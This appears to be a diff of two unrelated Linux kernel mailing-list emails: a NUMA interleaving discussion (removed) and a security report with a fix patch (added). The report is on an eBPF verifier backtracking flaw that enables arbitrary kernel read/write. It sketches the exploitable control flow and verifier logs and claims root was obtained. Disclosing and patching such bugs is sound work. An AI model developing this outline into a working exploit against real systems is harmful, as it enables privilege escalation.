@@ -2,208 +2,507 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
-	by mail.lfdr.de (Postfix) with ESMTP id 6BACF7D1406
-	for <lists+linux-kernel@lfdr.de>; Fri, 20 Oct 2023 18:33:47 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id C23537D13AC
+	for <lists+linux-kernel@lfdr.de>; Fri, 20 Oct 2023 18:06:52 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1377804AbjJTQdp (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Fri, 20 Oct 2023 12:33:45 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:44582 "EHLO
+        id S1377931AbjJTQGs (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Fri, 20 Oct 2023 12:06:48 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:43942 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229648AbjJTQdn (ORCPT
+        with ESMTP id S1377961AbjJTQG2 (ORCPT
         <rfc822;linux-kernel@vger.kernel.org>);
-        Fri, 20 Oct 2023 12:33:43 -0400
-Received: from NAM11-CO1-obe.outbound.protection.outlook.com (mail-co1nam11on2078.outbound.protection.outlook.com [40.107.220.78])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 7CB2BCA;
-        Fri, 20 Oct 2023 09:33:41 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
- b=aYB8nF8bdQOKIwa97XwBFp35Lg3wFUXzwJMch3U1zwnVRKpDcqjVo25y7JXC246ucOMnhNgaUZ7YeUX7+N/tjvJEvQgd0mJhm+4oxPc1dYz+dgtHSjVYOXjFI4wc+kdK9XJQysaU1w1ojpe5pbsP233j+m5I+hyI5KdXk6yillqxswe71oX7RDyVEY+qKMLQ9l2g77275pWbLmTDsD8w4446a9aSXV/ZqJ11cmvpJq7MFUuVT6MrGb8hCPi3t3XMdmu6TpagXrIvLul7kJu9izZ641USiIZlzcZpC20QvMcUIkzODTkVB8BEWpW6Ii/xOWmFb73O5zTTqCQAD2yrmQ==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector9901;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=8SUxB3vUbMPnwPi1Ud0MQolns51Ic8Eds/tv1AqgrE8=;
- b=d3t8KWBnT0ontexpZ6znnrDtrF+J0Tr5Voq3KbIPZQkCC+QdhFFBy7es7GVcIM2i++2gjwSPPAvuxr8TuznSe2GJPWqCZ8S+lcP0KlEEvPfPSaAXja/sWmIyHtH9QxBbwpHDh7P1DztEh+/Y7q8G6Dg/ycvmh+Zz0+0yDNz2ykzeQAvDFqJv5NtdH12ICRBChAfHdJ6sGhKg5XwGwwUGDfvO1upxD3Uf6+f+GGkGmc8Xf9RazFFX9aYEfQ1VByeX9+aAhFLvPIRZZsibsXQYlA8K3cQW3pX2O3eniTkDRWregsqaBUHWHs9J7EXgegXHceYZlaNXPwFuyARPhWVo4Q==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=memverge.com; dmarc=pass action=none header.from=memverge.com;
- dkim=pass header.d=memverge.com; arc=none
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=memverge.com;
- s=selector2;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=8SUxB3vUbMPnwPi1Ud0MQolns51Ic8Eds/tv1AqgrE8=;
- b=F3pu49GxJWPCjuH/X0hROSRWhE1D/SmYsPr0x/zZGqkISdY8ocPghlHyNNSqi9llan+HUBZijnT9PIoWal5LxDWUUL4VyiBJoJNU4SD/MsOGMo8vljBqnuB72shX5koQOblLOdZrVtIHgVTqNnaIezxNdQY6LR9OmUfRwg5krT0=
-Authentication-Results: dkim=none (message not signed)
- header.d=none;dmarc=none action=none header.from=memverge.com;
-Received: from SJ0PR17MB5512.namprd17.prod.outlook.com (2603:10b6:a03:394::19)
- by PH0PR17MB4640.namprd17.prod.outlook.com (2603:10b6:510:84::16) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.6933.8; Fri, 20 Oct
- 2023 16:33:38 +0000
-Received: from SJ0PR17MB5512.namprd17.prod.outlook.com
- ([fe80::3cf6:989a:f717:7c20]) by SJ0PR17MB5512.namprd17.prod.outlook.com
- ([fe80::3cf6:989a:f717:7c20%4]) with mapi id 15.20.6907.022; Fri, 20 Oct 2023
- 16:33:37 +0000
-Date:   Thu, 19 Oct 2023 09:26:15 -0400
-From:   Gregory Price <gregory.price@memverge.com>
-To:     "Huang, Ying" <ying.huang@intel.com>
-Cc:     Gregory Price <gourry.memverge@gmail.com>, linux-mm@kvack.org,
-        linux-kernel@vger.kernel.org, linux-cxl@vger.kernel.org,
-        akpm@linux-foundation.org, sthanneeru@micron.com,
-        "Aneesh Kumar K.V" <aneesh.kumar@linux.ibm.com>,
-        Wei Xu <weixugc@google.com>,
-        Alistair Popple <apopple@nvidia.com>,
-        Dan Williams <dan.j.williams@intel.com>,
-        Dave Hansen <dave.hansen@intel.com>,
-        Johannes Weiner <hannes@cmpxchg.org>,
-        Jonathan Cameron <Jonathan.Cameron@huawei.com>,
-        Michal Hocko <mhocko@kernel.org>,
-        Tim Chen <tim.c.chen@intel.com>, Yang Shi <shy828301@gmail.com>
-Subject: Re: [RFC PATCH v2 0/3] mm: mempolicy: Multi-tier weighted
- interleaving
-Message-ID: <ZTEud5K5T+dRQMiM@memverge.com>
-References: <20231009204259.875232-1-gregory.price@memverge.com>
- <87o7gzm22n.fsf@yhuang6-desk2.ccr.corp.intel.com>
- <ZS3jQRnX4VIdyTL5@memverge.com>
- <87pm1cwcz5.fsf@yhuang6-desk2.ccr.corp.intel.com>
- <ZS33ClT00KsHKsXQ@memverge.com>
- <87edhrunvp.fsf@yhuang6-desk2.ccr.corp.intel.com>
- <ZS9HSIrblel39qrt@memverge.com>
- <87fs25g6w3.fsf@yhuang6-desk2.ccr.corp.intel.com>
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <87fs25g6w3.fsf@yhuang6-desk2.ccr.corp.intel.com>
-X-ClientProxiedBy: PH8PR21CA0019.namprd21.prod.outlook.com
- (2603:10b6:510:2ce::9) To SJ0PR17MB5512.namprd17.prod.outlook.com
- (2603:10b6:a03:394::19)
+        Fri, 20 Oct 2023 12:06:28 -0400
+X-Greylist: delayed 398 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Fri, 20 Oct 2023 09:05:55 PDT
+Received: from smtp0.epfl.ch (smtp0.epfl.ch [IPv6:2001:620:618:1e0:1:80b2:e058:1])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 1131C10C9
+        for <linux-kernel@vger.kernel.org>; Fri, 20 Oct 2023 09:05:55 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=epfl.ch;
+      s=epfl; t=1697817553;
+      h=From:To:CC:Subject:Date:Message-ID:MIME-Version:Content-Transfer-Encoding:Content-Type;
+      bh=nvha9B0f5YmQEV8yWQ+1iXHp0mYyl9Hnm4LbeKZHiFQ=;
+      b=q99jqt1nS6W/veMQV9MGQkMXqGaMP1jJz636WSus4hf72BT6DfmHzz2Tb9+1VhTyH
+        ddBYuzsX50ztGrHM3dzrvvNlA9N1dOz6oE8x5lo3ICOqgR1XBsNTH7xEVDQiPefil
+        3A2CxLLVM3RMpKTkfa9Ry+GZdy0TbFZ/LIIceFnSI=
+Received: (qmail 3783 invoked by uid 107); 20 Oct 2023 15:59:13 -0000
+Received: from ax-snat-224-178.epfl.ch (HELO ewa07.intranet.epfl.ch) (192.168.224.178) (TLS, ECDHE-RSA-AES256-GCM-SHA384 (P-256 curve) cipher)
+  by mail.epfl.ch (AngelmatoPhylax SMTP proxy) with ESMTPS; Fri, 20 Oct 2023 17:59:13 +0200
+X-EPFL-Auth: Gn6lFcHt9EY9gDGLr/cKCEKRW7rjvYp6wGHOK9+PmKuvXarYtks=
+Received: from rs3labsrv2.iccluster.epfl.ch (10.90.46.62) by
+ ewa07.intranet.epfl.ch (128.178.224.178) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.1.2507.31; Fri, 20 Oct 2023 17:59:12 +0200
+From:   Tao Lyu <tao.lyu@epfl.ch>
+To:     <ast@kernel.org>, <daniel@iogearbox.net>,
+        <john.fastabend@gmail.com>, <andrii@kernel.org>,
+        <martin.lau@linux.dev>, <song@kernel.org>,
+        <yonghong.song@linux.dev>, <kpsingh@kernel.org>, <sdf@google.com>,
+        <haoluo@google.com>, <jolsa@kernel.org>, <mykolal@fb.com>,
+        <shuah@kernel.org>, <security@kernel.org>
+CC:     <linux-kernel@vger.kernel.org>, <bpf@vger.kernel.org>,
+        <linux-kselftest@vger.kernel.org>, <sanidhya.kashyap@epfl.ch>,
+        <mathias.payer@nebelwelt.net>, <meng.xu.cs@uwaterloo.ca>,
+        <kartikeya.dwivedi@epfl.ch>, <tao.lyu@epfl.ch>
+Subject: [PATCH] Incorrect backtracking for load/store or atomic ops
+Date:   Fri, 20 Oct 2023 17:58:42 +0200
+Message-ID: <20231020155842.130257-1-tao.lyu@epfl.ch>
+X-Mailer: git-send-email 2.25.1
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: SJ0PR17MB5512:EE_|PH0PR17MB4640:EE_
-X-MS-Office365-Filtering-Correlation-Id: 35bf1aa0-4603-4c5f-a1f9-08dbd18a4faf
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam: BCL:0;
-X-Microsoft-Antispam-Message-Info: QkUc9n3+2oFg594TF/AkFwLvkDICYt2ZAooasFWuBHuTvi0WWSSRSooGLbwVO5kaskSMKcZU/mFfRWXQ0RZWmyMFr/URU0Q6bs/LKw5gzCtfo9Gk+nddwD0CJCQ7VHG/PI9nuWmsJzqoc6fMmJLmI308nH5dDAgL2DrFjkIVdJzurqASLGxI4Vs44xjp9ushjWKkDzBfefJeA/XPTcYi80tQOsoZQKspFOhc2zxB7AC+fw+KCptOIpBpHV+Ma7aMF39DAuEQMbSZKhzRgNM+M2uw/Z2UuhFqYInCWo8BMGwYEdKHkyQTStXpBwPsB5BO/z1gv6mrfDiFFf9UGudJavTMLhJzhsRcT3O6qoV6GOR7okcQtkzQKwtdbHVnyjEwwNTZPDjmGFnUSyfWRn8jrxkKWxhcpgsEOecySe+pwlJuXpI88xSq1NXXRgJBrgoLv36Pd1XLaH56GUA3LqngoNayCOATGcyfFDr3Z67uOnXp8rvIMUiEh6xs8LFgWGok0Ln9H8PE8ZU7k/APHSqreeqF+FNVHQMdiBJA63zR+Yrzlgo54pEqaYnLjszlHUBNh7fD9688qEXgwzqVPl3XrG9md14VkgfGtuIPJi/l5tpwZxu96UBHqWAUMPogfxTAua/ra3+eA/FqfYaA6I2wew==
-X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:SJ0PR17MB5512.namprd17.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230031)(346002)(136003)(39840400004)(366004)(396003)(376002)(230922051799003)(451199024)(64100799003)(186009)(1800799009)(38100700002)(6506007)(6666004)(83380400001)(6512007)(2616005)(86362001)(2906002)(4326008)(7416002)(44832011)(41300700001)(26005)(8676002)(8936002)(66476007)(316002)(36756003)(66556008)(6916009)(54906003)(66946007)(5660300002)(478600001)(6486002)(16393002)(67856001);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0: =?us-ascii?Q?ERVkUfyJ01JTtjBioN4D2LG6XLYVzPgPlZeGl35bwMV4Q58CbQhnLA4hKGQp?=
- =?us-ascii?Q?XXxLCmGGk7Aj3k9beLG3OXwHC8nhT9HkzwRabFJjvSva1yX6GjZy6g4GF1fA?=
- =?us-ascii?Q?/BzNMvEVwwbMBQqufQhyAeSC/rdrBVEz4EeibqgtAD0trdExzU2a98n11ooQ?=
- =?us-ascii?Q?mVjF/hKTjWnzIbW5W14OcZKk+Zckv1ZVElCzELqCfFtW8LnSAqymGce/Ynex?=
- =?us-ascii?Q?6mN1XuB9WIdpcAxENQXpNRFesJMwPDCUN9P8clVN45pCSvfYdJC8a8GxYbD4?=
- =?us-ascii?Q?ATYSuKevF+OKs4xlj0O6g0vD8SlSoQK5ofiNZPeyT5Dgr1XtzVHprXDt7JJT?=
- =?us-ascii?Q?DJCOSmKU2/L6rZKK0VcNX6emrk69i1+cLmLv8om2Ma2tnfHlDrej7zeVCy/l?=
- =?us-ascii?Q?1+LdWBXgWmKyablqaXSQqShByGs1cE9JyybTV3yVafqWTFnbE4oRVKWJw8aN?=
- =?us-ascii?Q?1LpSeyu5LbrNh6nG7tKNADyCKkL60TBgX5bTkj7JdnDc1PPFk2hlv46xiG2F?=
- =?us-ascii?Q?c/JSV2skMYFt1dPXPeZoc/Xrgv7sd6wygITfXrIwP0yO2QIdLP3Jh3HTuqJa?=
- =?us-ascii?Q?i9FeTWbygLOVlWRZsPEV46jtnFcfywxgNcugDQnkgTNCm3E5lN8GtToarmaC?=
- =?us-ascii?Q?Fz7qYUjCMTNaNi18+oEW+Vc3oTrzMSytA3EIUKk5WWKZzybyxnnfXuutTXJ+?=
- =?us-ascii?Q?AAqMQaEms8WxiWRAz/8eHOsbq3fI4YOy+g3Eg3PqCxaDJDy39/jRb225SDIe?=
- =?us-ascii?Q?C/gvoq9SVkU9p3nfESl2Li14TNAwmYbqwZeN3vo5mFUc6A7bF3WnXxun/nLk?=
- =?us-ascii?Q?BKKNzOBmwqv0Dnd8UbPZ5sj0FwflAEFziShxBSxlrgeBg+vMn2P+MjWooOGb?=
- =?us-ascii?Q?9KOMeGynU2V0Fy2cRO9/Urw7QpcZ0sID3hJ5n0vNMFOLQXrVybLr/T0jZ2sD?=
- =?us-ascii?Q?87q2L/oIOl/ttb4QeOo8+uTylRMq8zC78FvpF9uFlpgbt/5oScxIb+mXOzfz?=
- =?us-ascii?Q?YDBmLcYXViF5oWpD7lTnmi2q36/WhG+Py08xrWggLFVFdlDCuAshC7cWZRd7?=
- =?us-ascii?Q?KzUGVyoESEuiEJUfp6qzBQ9fV0TjGPBVD2v+XFcCzf4Xp9u4jAULA5fZxm01?=
- =?us-ascii?Q?7KTmE7aFqtSIsUrll330612MQXXJ+O+cN2w0Amz1nlIjPOQYsF9BFoTLqwlV?=
- =?us-ascii?Q?60SxdrHW0IWNYfset/guGE4hfnKksLjDIu8bdeBhkyMs4m08OwTaTpw0vbZX?=
- =?us-ascii?Q?XSjAm+r1mTpiKFsTpBUUpCa143z+EUlA8o7PqCk424/y3aYon+oP1fhEdLko?=
- =?us-ascii?Q?6a05/aCFCESigMookYM+5a+MB33QgBP7VwcyVyyBnYJrNSQb5MhkSzbuTHrh?=
- =?us-ascii?Q?Uq2ex2SNeVa5fV6BtuZxYHsJVJGeRdhoFK81q7pefdUPNhgmeKtwilhN2o3F?=
- =?us-ascii?Q?QfD16h4C4KdsxajtCCX/dp2PMMLY6MGgWoEHZRoz37+Va9Ysgn2g45pQ1F7o?=
- =?us-ascii?Q?bzUZhDF+pQHJu37zW5aunAy2NqeKuicLWSUW1H2HU0d+9eMSMrgcU3XrUSzr?=
- =?us-ascii?Q?Uf5DKD7Ss1iMS3dZDY2267O8qPgjdyb2QRhdJpa7+8HgFafImfwAmrOhBMNa?=
- =?us-ascii?Q?Gw=3D=3D?=
-X-OriginatorOrg: memverge.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 35bf1aa0-4603-4c5f-a1f9-08dbd18a4faf
-X-MS-Exchange-CrossTenant-AuthSource: SJ0PR17MB5512.namprd17.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 20 Oct 2023 16:33:37.7306
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 5c90cb59-37e7-4c81-9c07-00473d5fb682
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: a7ZDN19NR7P7ngirqopE77Sv+zaqVYO+x81ykZ/xT+EhhSP/AJ2foNr8I1kH99LtozWdmBCUPl44yNSauRxaTB9l504QyTZNMmtZK0+jcN4=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: PH0PR17MB4640
-X-Spam-Status: No, score=-0.8 required=5.0 tests=BAYES_00,DATE_IN_PAST_24_48,
-        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,
-        RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_H2,SPF_HELO_PASS,SPF_PASS
-        autolearn=no autolearn_force=no version=3.4.6
+Content-Transfer-Encoding: 8bit
+Content-Type: text/plain
+X-Originating-IP: [10.90.46.62]
+X-ClientProxiedBy: ewa07.intranet.epfl.ch (128.178.224.178) To
+ ewa07.intranet.epfl.ch (128.178.224.178)
+X-Spam-Status: No, score=-4.4 required=5.0 tests=BAYES_00,DKIM_SIGNED,
+        DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,RCVD_IN_DNSWL_MED,SPF_HELO_PASS,
+        SPF_PASS autolearn=unavailable autolearn_force=no version=3.4.6
 X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
         lindbergh.monkeyblade.net
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Fri, Oct 20, 2023 at 02:11:40PM +0800, Huang, Ying wrote:
-> Gregory Price <gregory.price@memverge.com> writes:
-> 
-> >
-[...snip...]
-> > Example 2: A dual-socket system with 1 CXL device per socket
-> > ===
-> > CPU Nodes: node0, node1
-> > CXL Nodes: node2, node3 (on sockets 0 and 1 respective)
-> >
-[...snip...]
-> > This is similar to example #1, but with one difference:  A task running
-> > on node 0 should not treat nodes 0 and 1 the same, nor nodes 2 and 3.
-[...snip...]
-> > This leaves us with weights of:
-> >
-> > node0 - 57%
-> > node1 - 26%
-> > node2 - 12%
-> > node3 - 5%
-> >
-> 
-> Does the workload run on CPU of node 0 only?  This appears unreasonable.
+Hi,
 
-Depends.  if a user explicitly launches with `numactl --cpunodebind=0`
-then yes, you can force a task (and all its children) to run on node0.
+I found the backtracking logic of the eBPF verifier is flawed
+when meeting 1) normal load and store instruction or
+2) atomic memory instructions.
 
-If a workload multi-threaded enough to run on both sockets, then you are
-right that you'd want to basically limit cross-socket traffic by binding
-individual threads to nodes that don't cross sockets - if at all
-feasible this may not be feasible).
+# Normal load and store
 
-But at that point, we're getting into the area of numa-aware software.
-That's a bit beyond the scope of this - which is to enable a coarse
-grained interleaving solution that can easily be accessed with something
-like `numactl --interleave` or `numactl --weighted-interleave`.
+Here, I show one case about the normal load and store instructions,
+which can be exploited to achieve arbitrary read and write with two requirements:
+1) The uploading program should have at least CAP_BPF, which is required for most eBPF applications.
+2) Disable CPU mitigations by adding "mitigations=off" in the kernel booting command line. Otherwise,
+the Spectre mitigation in the eBPF verifier will prevent exploitation.
 
-> If the memory bandwidth requirement of the workload is so large that CXL
-> is used to expand bandwidth, why not run workload on CPU of node 1 and
-> use the full memory bandwidth of node 1?
+                                   1: r3 = r10 (stack pointer)
+                                   3:           if cond
+                                                 /           \
+                                               /                \
+        4: *(u64 *)(r3 -120) = 200      6: *(u64 *)(r3 -120) = arbitrary offset to r2
+                 verification state 1                  verification state 2 (prune point)
+                                              \                  /
+                                                \              /
+                                      7:  r6 = *(u64 *)(r1 -120)
+                                                         ...
+                                    17:    r7 = a map pointer
+                                    18:            r7 += r6
+                         // Out-of-bound access from the right side path
 
-Settings are NOT one size fits all.  You can certainly come up with another
-scenario in which these weights are not optimal.
+Give an eBPF program (tools/testing/selftests/bpf/test_precise.c) 
+whose simplified control flow graph looks like the above.
+When the verifier goes through the first (left-side) path and reaches insn 18,
+it will backtrack on register 6 like below.
 
-If we're running enough threads that we need multiple sockets to run
-them concurrently, then the memory distribution weights become much more
-complex.  Without more precise control over task placement and
-preventing task migration, you can't really get an "optimal" placement.
+18: (0f) r7 += r6
+mark_precise: frame0: last_idx 18 first_idx 17 subseq_idx -1 
+mark_precise: frame0: regs=r6 stack= before 17: (bf) r7 = r0
+...
+mark_precise: frame0: regs=r6 stack= before 7: (79) r6 = *(u64 *)(r3 -120)
 
-What I'm really saying is "Task placement is a more powerful function
-for predicting performance than memory placement".  However, user
-software would need to implement a pseudo-scheduler and explicit data
-placement to be the most optimized.  Beyond this, there is only so much
-we can do from a `numactl` perspective.
+However, the backtracking process is problematic when it reaches insn 7.
+Insn 7 is to load a value from the stack, but the stack pointer is represented by r3 instead of r10.
+** In this case, the verifier (as shown below) will reset the precision on r6 and not mark the precision on the stack. **
+Afterward, the backtracking finishes without annotating any registers in any verifier states.
 
-tl;dr: We can't get a perfect system here, because getting a best-case
-for all possible scenarios is an probably undecidable problem. You will
-always be able to generate an example wherein the system is not optimal.
+    else if (class == BPF_LDX) {
+        if (!bt_is_reg_set(bt, dreg))
+            return 0;
+        bt_clear_reg(bt, dreg);
+        if (insn->src_reg != BPF_REG_FP)
+            return 0;
+        ...
+   }
 
-> 
-> If the workload run on CPU of node 0 and node 1, then the cross-socket
-> traffic should be minimized if possible.  That is, threads/processes on
-> node 0 should interleave memory of node 0 and node 2, while that on node
-> 1 should interleave memory of node 1 and node 3.
+Finally, when the second (left-side) path reaches insn 7 again,
+it will compare the verifier states with the previous one.
+However, it realizes these two states are equal because no precision is on r6,
+thus the eBPF program an easily pass the verifier
+although the second path contains an invalid access offset.
+We have successfully exploited this bug for getting the root privilege.
+If needed, we can share the exploitation.
+BTW, when using the similar instructions in sub_prog can also trigger an assertion in the verifier:
+"[ 1510.165537] verifier backtracking bug
+[ 1510.165582] WARNING: CPU: 2 PID: 382 at kernel/bpf/verifier.c:3626 __mark_chain_precision+0x4568/0x4e50"
 
-This can be done with set_mempolicy() with MPOL_INTERLEAVE and set the
-nodemask to the what you describe.  Those tasks need to also prevent
-themselves from being migrated as well.  But this can absolutely be
-done.
 
-In this scenario, the weights need to be re-calculated to be based on
-the bandwidth of the nodes in the mempolicy nodemask, which is what i
-described in the last email.
 
-~Gregory
+IMO, to fully patch this bug, we need to know whether the insn->src_reg is an alias of BPF_REG_FP.
+However, it might need too much code addition.
+Or we just do not clear the precision on the src register. 
+
+# Atomic memory instructions
+
+Then, I show that the backtracking on atomic load and store is also flawed.
+As shown below, when the backtrack_insn() function in the verifier meets store instructions,
+it checks if the stack slot is set with precision or not. If not, just return. 
+
+            if (!bt_is_slot_set(bt, spi))
+                return 0;
+            bt_clear_slot(bt, spi);
+            if (class == BPF_STX)
+                bt_set_reg(bt, sreg);
+
+Assume we have an atomic_fetch_or instruction (tools/testing/selftests/bpf/verifier/atomic_precision.c) shown below.
+
+7: (4c) w7 |= w3
+mark_precise: frame1: last_idx 7 first_idx 0 subseq_idx -1 
+mark_precise: frame1: regs=r7 stack= before 6: (c3) r7 = atomic_fetch_or((u32 *)(r10 -120), r7)
+mark_precise: frame1: regs=r7 stack= before 5: (bf) r7 = r10
+mark_precise: frame1: regs=r10 stack= before 4: (7b) *(u64 *)(r3 -120) = r1
+mark_precise: frame1: regs=r10 stack= before 3: (bf) r3 = r10
+mark_precise: frame1: regs=r10 stack= before 2: (b7) r1 = 1000
+mark_precise: frame1: regs=r10 stack= before 0: (85) call pc+1
+BUG regs 400
+
+Before backtracking to it, r7 has already been marked as precise.
+Since the value of r7 after atomic_fecth_or comes from r10-120,
+it should propagate the precision to r10-120.
+However, because the stack slot r10-120 is not marked,
+it doesn't satisfy bt_is_slot_set(bt, spi) condition shown above.
+Finally, it just returns without marking r10-120 as precise. 
+
+This bug can lead to the verifier's assertion as well:
+"[ 1510.165537] verifier backtracking bug
+[ 1510.165582] WARNING: CPU: 2 PID: 382 at kernel/bpf/verifier.c:3626 __mark_chain_precision+0x4568/0x4e50"
+
+I've attached the patch for correctly propagating the precision on atomic instructions.
+But it still can't solve the problem that the stack slot is expressed with other registers instead of r10.
+
+Signed-off-by: Tao Lyu <tao.lyu@epfl.ch>
+---
+ kernel/bpf/verifier.c                         |  58 +++++-
+ tools/testing/selftests/bpf/Makefile          |   6 +-
+ tools/testing/selftests/bpf/test_precise.c    | 186 ++++++++++++++++++
+ .../selftests/bpf/verifier/atomic_precision.c |  19 ++
+ 4 files changed, 263 insertions(+), 6 deletions(-)
+ create mode 100644 tools/testing/selftests/bpf/test_precise.c
+ create mode 100644 tools/testing/selftests/bpf/verifier/atomic_precision.c
+
+diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
+index e777f50401b6..4e86cd2cadd3 100644
+--- a/kernel/bpf/verifier.c
++++ b/kernel/bpf/verifier.c
+@@ -3495,6 +3495,7 @@ static int backtrack_insn(struct bpf_verifier_env *env, int idx, int subseq_idx,
+ 	u32 dreg = insn->dst_reg;
+ 	u32 sreg = insn->src_reg;
+ 	u32 spi, i;
++	u32 set_spi, set_sreg;
+ 
+ 	if (insn->code == 0)
+ 		return 0;
+@@ -3512,6 +3513,11 @@ static int backtrack_insn(struct bpf_verifier_env *env, int idx, int subseq_idx,
+ 		if (!bt_is_reg_set(bt, dreg))
+ 			return 0;
+ 		if (opcode == BPF_MOV) {
++			if (dreg == BPF_REG_FP || sreg == BPF_REG_FP) {
++				verbose(env, "BUG: backtracking to r10\n");
++				WARN_ONCE(1, "verifier backtracking bug");
++				return -EFAULT;
++			}
+ 			if (BPF_SRC(insn->code) == BPF_X) {
+ 				/* dreg = sreg or dreg = (s8, s16, s32)sreg
+ 				 * dreg needs precision after this insn
+@@ -3580,11 +3586,53 @@ static int backtrack_insn(struct bpf_verifier_env *env, int idx, int subseq_idx,
+ 			WARN_ONCE(1, "verifier backtracking bug");
+ 			return -EFAULT;
+ 		}
+-		if (!bt_is_slot_set(bt, spi))
+-			return 0;
+-		bt_clear_slot(bt, spi);
+-		if (class == BPF_STX)
+-			bt_set_reg(bt, sreg);
++		if (BPF_MODE(insn->code) == BPF_ATOMIC) {
++			switch (insn->imm) {
++				case BPF_ADD:
++				case BPF_AND:
++				case BPF_OR:
++				case BPF_XOR:
++					if (bt_is_slot_set(bt, spi)) {
++						bt_set_reg(bt, sreg);
++					}
++					break;
++				case BPF_ADD | BPF_FETCH:
++				case BPF_AND | BPF_FETCH:
++				case BPF_OR | BPF_FETCH:
++				case BPF_XOR | BPF_FETCH:
++					set_spi = bt_is_reg_set(bt, sreg);
++					set_sreg = bt_is_slot_set(bt, spi);
++					if (set_spi) {
++						bt_set_slot(bt, spi);
++						bt_clear_reg(bt, sreg);
++					}
++					if (set_sreg) {
++						bt_set_slot(bt, spi);
++						bt_set_reg(bt, sreg);
++					}
++					break;
++				case BPF_XCHG:
++				case BPF_CMPXCHG:
++					if (bt_is_reg_set(bt, sreg) && bt_is_slot_set(bt, spi))
++						return 0;
++					else if (bt_is_reg_set(bt, sreg)) {
++						bt_set_slot(bt, spi);
++						bt_clear_reg(bt, sreg);
++					} else if (bt_is_slot_set(bt, spi)) {
++						bt_set_reg(bt, sreg);
++						bt_clear_slot(bt, spi);
++					} else {
++						return 0;
++					}
++					break;
++			}
++        } else {
++               if (!bt_is_slot_set(bt, spi))
++                       return 0;
++               bt_clear_slot(bt, spi);
++               if (class == BPF_STX)
++                       bt_set_reg(bt, sreg);
++        }
+ 	} else if (class == BPF_JMP || class == BPF_JMP32) {
+ 		if (bpf_pseudo_call(insn)) {
+ 			int subprog_insn_idx, subprog;
+diff --git a/tools/testing/selftests/bpf/Makefile b/tools/testing/selftests/bpf/Makefile
+index 4225f975fce3..2d3d2d6b159b 100644
+--- a/tools/testing/selftests/bpf/Makefile
++++ b/tools/testing/selftests/bpf/Makefile
+@@ -53,7 +53,8 @@ TEST_GEN_PROGS = test_verifier test_tag test_maps test_lru_map test_lpm_map test
+ 	test_sock test_sockmap get_cgroup_id_user \
+ 	test_cgroup_storage \
+ 	test_tcpnotify_user test_sysctl \
+-	test_progs-no_alu32
++	test_progs-no_alu32 \
++	test_precise
+ TEST_INST_SUBDIRS := no_alu32
+ 
+ # Also test bpf-gcc, if present
+@@ -647,6 +648,9 @@ $(OUTPUT)/test_verifier: test_verifier.c verifier/tests.h $(BPFOBJ) | $(OUTPUT)
+ 	$(call msg,BINARY,,$@)
+ 	$(Q)$(CC) $(CFLAGS) $(filter %.a %.o %.c,$^) $(LDLIBS) -o $@
+ 
++$(OUTPUT)/test_precise: test_precise.c
++	$(Q)$(CC) $(CFLAGS) $(filter %.a %.o %.c,$^) -o $@
++
+ # Include find_bit.c to compile xskxceiver.
+ EXTRA_SRC := $(TOOLSDIR)/lib/find_bit.c
